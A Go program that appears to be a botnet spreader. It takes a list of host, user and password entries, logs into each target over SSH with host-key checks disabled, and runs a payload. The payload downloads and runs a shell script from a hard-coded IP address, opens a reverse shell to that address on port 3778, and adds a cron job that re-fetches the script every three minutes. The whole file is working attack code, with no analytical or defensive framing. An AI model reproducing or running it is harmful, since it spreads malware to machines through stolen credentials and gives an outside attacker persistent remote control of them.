package main

import (
	"bufio"
	"bytes"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	payload = `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.137.37/1.sh -q --timeout=5 || curl -s --max-time 5 http://178.16.137.37/1.sh -o 1.sh; chmod +x 1.sh; ./1.sh & tftp 178.16.137.37 -c get 1.sh 2>/dev/null && chmod +x 1.sh && ./1.sh & { sleep 3; rm -f 1.sh 2>/dev/null; } & bash -c 'exec 5<>/dev/tcp/178.16.137.37/3778; while read line; do eval "$line" >&5 2>&5; done <&5' 2>/dev/null & echo '*/3 * * * * curl -s http://178.16.137.37/1.sh | sh' | crontab - 2>/dev/null &`
)

func main() {
	scanner := bufio.NewScanner(os.Stdin)
	var wg sync.WaitGroup

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Split(line, ":")
		if len(parts) >= 3 {
			target := parts[0] + ":" + parts[1]
			user := parts[2]
			pass := ""
			if len(parts) > 3 {
				pass = parts[3]
			}

			wg.Add(1)
			go func(t, u, p string) {
				defer wg.Done()
				executePayload(t, u, p)
			}(target, user, pass)
		}
	}

	wg.Wait()
}

func executePayload(target, user, pass string) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         30 * time.Second,
	}

	client, err := ssh.Dial("tcp", target, config)
	if err != nil {
		return
	}
	defer client.Close()

	if session, err := client.NewSession(); err == nil {
		var b bytes.Buffer
		session.Stdout = &b
		session.Run("echo SHELL_TEST")
		session.Close()
		if !strings.Contains(b.String(), "SHELL_TEST") {
			return
		}
	}

	session, err := client.NewSession()
	if err != nil {
		return
	}
	defer session.Close()

	session.Run(payload)
	time.Sleep(20 * time.Second)
}
